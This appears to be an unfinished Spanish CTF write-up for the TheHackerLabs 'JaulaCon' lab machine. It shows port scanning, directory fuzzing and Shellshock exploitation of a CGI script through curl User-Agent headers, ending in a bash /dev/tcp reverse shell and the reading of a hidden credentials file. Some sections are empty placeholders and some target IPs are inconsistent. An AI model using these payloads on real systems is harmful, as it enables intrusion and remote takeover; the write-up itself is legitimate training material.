---
layout: single
title: JaulaCon - TheHackerLabs
excerpt: "."
date: 2025-03-25
classes: wide
header:
  teaser: /assets/images/THL-writeup-jaulaCon/_logo.png
  teaser_home_page: true
  icon: /assets/images/thehackerlabs.jpeg
categories:
  - TheHackerLabs
  - Easy Machine
tags:
  - Linux
  - 
  - 
  - 
---
![](/assets/images/THL-writeup-jaulaCon/_logo.png)

texto

Herramientas utilizadas:
* *ping*
* *nmap*
* **
* **
* **
* **


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#"></a></li>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#"></a></li>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
			<ul>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.200
PING 192.168.1.200 (192.168.1.200) 56(84) bytes of data.
64 bytes from 192.168.1.200: icmp_seq=1 ttl=64 time=1.14 ms
64 bytes from 192.168.1.200: icmp_seq=2 ttl=64 time=0.835 ms
64 bytes from 192.168.1.200: icmp_seq=3 ttl=64 time=1.17 ms
64 bytes from 192.168.1.200: icmp_seq=4 ttl=64 time=0.796 ms

--- 192.168.1.200 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 0.796/0.984/1.168/0.169 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

<h2 id="Puertos">Escaneo de Puertos</h2>

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.200 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-25 11:54 CST
Initiating ARP Ping Scan at 11:54
Scanning 192.168.1.200 [1 port]
Completed ARP Ping Scan at 11:54, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:54
Scanning 192.168.1.200 [65535 ports]
Discovered open port 22/tcp on 192.168.1.200
Discovered open port 80/tcp on 192.168.1.200
Discovered open port 8080/tcp on 192.168.1.200
Discovered open port 3333/tcp on 192.168.1.200
Completed SYN Stealth Scan at 11:55, 42.96s elapsed (65535 total ports)
Nmap scan report for 192.168.1.200
Host is up, received arp-response (0.00064s latency).
Scanned at 2025-03-25 11:54:29 CST for 43s
Not shown: 36705 filtered tcp ports (no-response), 28827 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 64
80/tcp   open  http       syn-ack ttl 64
3333/tcp open  dec-notes  syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 63
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 43.23 seconds
           Raw packets sent: 118524 (5.215MB) | Rcvd: 28835 (1.153MB)
```

| Parámetros | Descripción |
|--------------------------|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Podemos ver 4 puertos abiertos y me da curiosiodad el **puerto 3333** y **puerto 8080**, pues me da la impresión que deben esconder algo.

<br>

<h2 id="Servicios">Escaneo de Servicios</h2>

```bash
nmap -sCV -p 22,80,3333,8080 192.168.1.200 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-25 11:55 CST
Nmap scan report for 192.168.1.200
Host is up (0.0011s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 f9:a8:dc:82:04:97:32:63:99:95:f7:c8:be:dc:b9:62 (ECDSA)
|_  256 00:c9:50:37:b5:21:c1:6e:e6:95:a0:ec:df:3b:cb:1c (ED25519)
80/tcp   open  http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Uoni
3333/tcp open  http    Node.js Express framework
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was /login
8080/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.26 seconds
```

| Parámetros | Descripción |
|--------------------------|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Bien, en el **puerto 80** parece ser una página normal que vamos a visitar y analizar, en cambio, el **puerto 3333** parece ser un login y el **puerto 8080** parece que solo muestra la página por defecto de **Apache2**.

Vamos a ver las tres para ver que nos podemos encontrar.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
</div>
<br>


<h2 id="HTTP">Analizando Servicio HTTP</h2>

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon/Captura1.png">
</p>

Parece ser una página de venta de relojes.

Veamos que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon/Captura2.png">
</p>

Son bastantes tecnologías las que nos esta mostrando, pero de momento no veo algo que nos ayude.

Podemos revisar todas las páginas, pero practicamente es la página principal diseccionada en varias partes:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon/Captura3.png">
</p>

De ahí en fuera, no he encontrado nada más, 

Si entramos en la página activa del **puerto 3333**, podemos ver el login que nos reporto el escaneo:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon/Captura4.png">
</p>

Como no tenemos credenciales válidas, no podremos hacer nada. Y me da curiosidad que **Wappalizer** no reporta ninguna tecnología.

Y no hay porque revisar la página del **puerto 8080**, ya que solamente es la página por defecto de **Apache2**, esto me hace pensar que aquí hay algo oculto.

Es momento de aplicar **Fuzzing**.

<br>

<h2 id="fuzz">Fuzzing</h2>

```bash
wfuzz -c --hc=404 -t 300 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.1.200:8080/FUZZ/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.200:8080/FUZZ/
Total requests: 220545

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000021:   403        9 L      28 W       282 Ch      "cgi-bin"                                                                                                                    
000000069:   403        9 L      28 W       282 Ch      "icons"                                                                                                                      
000045226:   200        368 L    933 W      10701 Ch    "http://192.168.1.200:8080//"                                                                                              
000095510:   403        9 L      28 W       282 Ch      "server-status"                                                                                                              

Total time: 258.9164
Processed Requests: 220545
Filtered Requests: 220541
Requests/sec.: 851.7998
```

| Parámetros | Descripción |
|--------------------------|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

<br>

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.1.200:8080/ -w /usr/share/wordlists/dirb/common.txt -t 100 -x php,html,txt,sh
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.200:8080/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,sh
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 282]
/.htpasswd            (Status: 403) [Size: 282]
/.htpasswd.php        (Status: 403) [Size: 282]
/.hta.php             (Status: 403) [Size: 282]
/.hta.html            (Status: 403) [Size: 282]
/.hta.txt             (Status: 403) [Size: 282]
/.htaccess            (Status: 403) [Size: 282]
/.htaccess.sh         (Status: 403) [Size: 282]
/.htaccess.php        (Status: 403) [Size: 282]
/.htaccess.html       (Status: 403) [Size: 282]
/.htpasswd.html       (Status: 403) [Size: 282]
/.htpasswd.txt        (Status: 403) [Size: 282]
/.htpasswd.sh         (Status: 403) [Size: 282]
/.html                (Status: 403) [Size: 282]
/.htaccess.txt        (Status: 403) [Size: 282]
/.hta.sh              (Status: 403) [Size: 282]
/cgi-bin/.html        (Status: 403) [Size: 282]
/cgi-bin/             (Status: 403) [Size: 282]
/index.html           (Status: 200) [Size: 10701]
/index.html           (Status: 200) [Size: 10701]
/server-status        (Status: 403) [Size: 282]
Progress: 23070 / 23075 (99.98%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|--------------------------|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*	     | Para indicar las extensiones de archivos especificas a buscar. |

<br>

Encontramos el directorio `/cgi-bin/` lo que es un indicativo de que la página puede ser vulnerable al **ataque ShellShock**.

Nota: curiosamente, **gobuster** no encuentra el directorio **cgi-bin** con los wordlists de **Seclists**, pero si con el de **dirb** que es el **common.txt**.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
</div>
<br>


<h2 id="shellshock">Buscando Posibles Archivos Vulnerables a Ataques ShellShock</h2>

Aquí te dejo un blog que explica bastante bien esta vulnerabilidad:
* <a href="https://deephacking.tech/shellshock-attack-web/" target="_blank">Shellshock Attack</a>

Lo principal que tenemos que hacer, es buscar archivos que sean vulnerables ante este ataque, por lo que tenemos que aplicar **Fuzzing** de nuevo, enfocandonos en buscar archivos con extension **.sh y .cgi**.

Hagamoslo:
```bash
wfuzz -c --hc=404 -t 300 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -z list,sh-cgi http://192.168.1.200:8080/cgi-bin/FUZZ.FUZ2Z
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.200:8080/cgi-bin/FUZZ.FUZ2Z
Total requests: 2370480

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000795386:   200        6 L      6 W        34 Ch       "agua - cgi"                                                                                                                 

Total time: 0
Processed Requests: 2370480
Filtered Requests: 2370479
Requests/sec.: 0
```

| Parámetros | Descripción |
|--------------------------|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-z*	     | Para indicar una busqueda de archivos específicos. |

<br>

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.1.200:8080/cgi-bin/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t 100 -x sh,cgi
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.251:8080/cgi-bin/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              cgi,sh
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/agua.cgi             (Status: 200) [Size: 34]
Progress: 3555720 / 3555723 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|--------------------------|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*       | Para indicar las extensiones de archivos especificas a buscar. |

<br>

Lo tenemos, encontramos el **archivo agua.cgi**.

Vamos a aplicar pruebas para ver si es vulnerable al **ataque ShellShock**.

<br>

<h2 id="Shellshock">Probando y Explotando Vulnerabilidad ShellShock para Obtener una Reverse Shell de la Máquina Víctima</h2>

De manera sencilla, podemos utilizar un **script NSE de nmap** que identificar si el archivo que encontramos es vulnerable al **ataque ShellShock**:
```bash
nmap -sV -p 8080 --script http-shellshock --script-args uri=/cgi-bin/agua.cgi 192.168.1.200
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-25 14:34 CST
Nmap scan report for 192.168.1.200
Host is up (0.0011s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.59 ((Debian))
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|_      http://seclists.org/oss-sec/2014/q3/685
|_http-server-header: Apache/2.4.59 (Debian)
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.90 seconds
```
Muy bien, si es vulnerable.

De igual forma, podemos aplicar pruebas que vienen en **HackTricks** utilizando la herramienta **curl**:
* <a href="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/cgi.html?highlight=cgi#curl-reflected-blind-and-out-of-band" target="_blank">HackTricks - CGI: Curl (reflected, blind and out-of-band)</a>

Probemos primero el ataque reflejado: 
```bash
url -H 'User-Agent: () { :; }; echo; echo "VULNERABLE TO SHELLSHOCK"' http://192.168.1.200:8080/cgi-bin/agua.cgi 2>/dev/null| grep 'VULNERABLE'
VULNERABLE TO SHELLSHOCK
```
Funciona, se ve que es vulnerable.

Nota: Aquí le agregue el comando `echo;`, ya que si no no funcionara.

Hagamos otra prueba, aplicando el ataque blind en donde nos tiene que responder en 5 segundos:
```bash
curl -H 'User-Agent: () { :; }; echo; /bin/bash -c "sleep 5"' http://192.168.100.251:8080/cgi-bin/agua.cgi
```
Igual funciona, tardi exactamente 5 segundos en terminar la petición.

También podemos ver que usuario es el que esta ejecutando todo esto, que lo más seguro sea el **usuario www-data**:
```bash
curl -H "User-Agent: () { :; }; echo; /usr/bin/whoami" 'http://192.168.100.251:8080/cgi-bin/agua.cgi'
www-data
```
Excelente, si es ese usuario.

Por último, vamos a mandar una traza ICMP a nuestra máquina para ver si es que podemos aplicar una **Reverse Shell**.

Vamos a utilizar la herramienta **tcmpdump** para que captura la traza:
```bash
tcpdump -i eth0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

Y aplicando el **ataque ShellShock**, mandamos la traza desde la página con **curl**:
```bash
curl -H 'User-Agent: () { :; }; echo; /bin/bash -c "ping -c 2 Tu_IP"' http://192.168.1.200:8080/cgi-bin/agua.cgi
```

Observa la respuesta que obtuvimos:
```bash
tcpdump -i eth0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
16:12:32.811255 IP 192.168.1.200 > Tu_IP: ICMP echo request, id 1, seq 0, length 64
16:12:32.811275 IP 192.Tu_IP > 192.168.1.200: ICMP echo reply, id 1, seq 0, length 64
16:12:32.814288 IP 192.168.1.200 > TU_IP: ICMP echo request, id 1, seq 256, length 64
16:12:32.814300 IP 192.Tu_IP > 192.168.1.200: ICMP echo reply, id 1, seq 256, length 64
```
Muy bien, ya esta más que comprobada esta vulnerabilidad.


<br>

<h2 id=""></h2>

```bash
nc -nlvp 443
listening on [any] 443 ...
```

```bash
curl -H 'User-Agent: () { :; }; echo; /bin/bash -c "bash -i >& /dev/tcp/Tu_IP/443 0>&1"' http://192.168.1.200:8080/cgi-bin/agua.cgi
```

```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.100.250] from (UNKNOWN) [192.168.100.251] 48922
bash: no job control in this shell
www-data@10a5dfb83efd:/usr/lib/cgi-bin$ whoami
whoami
www-data
```




<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Post" style="text-align:center;">Post Explotación</h1>
</div>
<br>


<h2 id=""></h2>

```bash
www-data@7159efa19ddb:/opt$ ls -la
ls -la
total 12
drwxr-xr-x 1 root root 4096 Jun  1  2024 .
drwxr-xr-x 1 root root 4096 Mar 26 00:34 ..
-rw-r--r-- 1 root root   27 Jun  1  2024 .credenciales
www-data@7159efa19ddb:/opt$ cat .credenciales
cat .credenciales
```

```bash
www-data@7159efa19ddb:/usr/lib/cgi-bin$ ifconfig
ifconfig
bash: ifconfig: command not found
www-data@7159efa19ddb:/usr/lib/cgi-bin$ ip a
ip a
bash: ip: command not found
```

```bash

```



<br>
<br>
<div style="position: relative;">
  <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
</div>


* https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/cgi.html?highlight=cgi#curl-reflected-blind-and-out-of-band
* https://book.hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/index.html?highlight=proto#prototype-pollution


<br>
# FIN

<footer id="myFooter">
    <!-- Footer para eliminar el botón -->
</footer>

<style>
        #backToIndex {
                display: none;
                position: fixed;
                left: 87%;
                top: 90%;
                z-index: 2000;
                background-color: #81fbf9;
                border-radius: 10px;
                border: none;
                padding: 4px 6px;
                cursor: pointer;
        }
</style>

<a id="backToIndex" href="#Indice">
        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
</a>

<script>
    window.onscroll = function() { showButton() };

    function showButton() {
        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
        const indicePosition = document.getElementById("Indice").offsetTop;
        const footerPosition = document.getElementById("myFooter").offsetTop;
        const windowHeight = window.innerHeight;

        const button = document.getElementById("backToIndex");

        // Mostrar el botón si el usuario ha bajado al índice
        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
            button.style.display = "block";
            button.style.position = "fixed";
            button.style.top = "90%";
        } else {
            button.style.display = "none";
        }
    }
</script>
